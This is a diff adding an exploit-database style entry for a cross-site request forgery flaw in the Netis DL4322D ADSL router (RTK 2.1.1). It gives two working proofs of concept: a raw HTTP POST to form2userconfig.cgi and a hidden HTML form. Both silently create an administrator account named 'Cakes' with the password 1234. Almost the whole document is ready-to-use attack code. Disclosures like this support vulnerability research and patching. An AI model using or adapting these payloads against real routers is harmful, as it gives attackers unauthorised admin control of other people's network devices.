@@ -1,0 +1,42 @@
+# Exploit Title: Netis ADSL Router DL4322D RTK 2.1.1 - Cross-Site Request Forgery (Add Admin)
+# Author: Cakes
+# Discovery Date: 2018-10-01
+# Vendor Homepage: http://www.netis-systems.com
+# Software Link: http://www.netis-systems.com/Home/detail/id/74.html
+# Tested Version: RTK 2.1.1
+# Tested on OS: Kali Linux
+# CVE: N/A
+ 
+# Description
+# Due to improper session management an attacker is able to add a administrator account
+# without providing any authentication credentials.
+
+# PoC 1
+POST /form2userconfig.cgi HTTP/1.1
+Host: Target
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 112
+
+username=Cakes&privilege=2&newpass=1234&confpass=1234&adduser=Add&hiddenpass=&submit.htm%3Fuserconfig.htm=Send
+
+# PoC 2
+<html>
+  <body>
+    <form action="http://Target/form2userconfig.cgi" method="POST">
+      <input type="hidden" name="username" value="Cakes" />
+      <input type="hidden" name="privilege" value="2" />
+      <input type="hidden" name="newpass" value="1234" />
+      <input type="hidden" name="confpass" value="1234" />
+      <input type="hidden" name="adduser" value="Add" />
+      <input type="hidden" name="hiddenpass" value="" />
+      <input type="hidden" name="submit&#46;htm&#63;userconfig&#46;htm" value="Send" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
